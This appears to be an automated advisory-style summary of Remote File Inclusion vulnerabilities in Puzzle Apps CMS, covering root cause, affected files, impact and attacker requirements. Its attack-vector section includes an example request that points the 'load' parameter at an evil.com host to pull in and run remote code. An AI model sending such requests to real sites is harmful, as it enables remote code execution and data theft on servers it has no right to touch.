The provided content details multiple instances of Remote File Inclusion (RFI) vulnerabilities within the Puzzle Apps CMS.

**Root cause of vulnerability:**
The vulnerabilities stem from the use of `include` or `include_once` statements with file paths constructed using variables that can be influenced by user-controlled input, specifically through the `$_GET` parameter.

**Weaknesses/vulnerabilities present:**
- Unsanitized user input in the `$_GET["load"]` parameter. This allows attackers to inject arbitrary file paths into the include statements.
- Lack of input validation and sanitization on included file paths.
- Predictable file paths for core files

**Impact of exploitation:**
- Remote code execution by including malicious files from external sources. An attacker could execute arbitrary PHP code on the server.
- Data exfiltration if the included files are used to access databases or other sensitive information.
- Modification of application behavior and content.

**Attack vectors:**
- HTTP GET requests with a manipulated "load" parameter, for example: `http://vulnerable-site/path/to/file.php?load=http://evil.com/malicious_code`
- Exploiting the inclusion vulnerability of files like `core/modules/admin/libs/people.lib.php`, `core/modules/admin/libs/general.lib.php`, `core/modules/admin/libs/content.lib.php`, and `core/modules/admin/libs/templates.lib.php`.

**Required attacker capabilities/position:**
- The attacker needs to be able to send HTTP requests to the vulnerable web server.
- The attacker needs to identify a vulnerable page and the relevant parameter to inject a malicious file path.
- The attacker requires a publicly available file or a server under their control where the malicious file can be accessed from the vulnerable server.
